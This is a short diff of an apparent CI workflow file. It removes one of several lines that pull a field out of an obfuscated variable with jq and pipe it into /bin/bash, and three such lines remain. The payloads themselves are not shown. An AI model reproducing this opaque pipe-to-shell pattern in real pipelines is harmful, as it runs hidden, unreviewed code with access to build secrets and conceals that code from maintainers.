@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$rg762" | jq -r .r8623 | /bin/bash
           echo $ylhkf667 | jq -r .zk5 | /bin/bash
           printf '%s' "$i96331" | jq -r .s141 | /bin/bash
-          printf '%s' "$s96529" | jq -r .ud90875 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
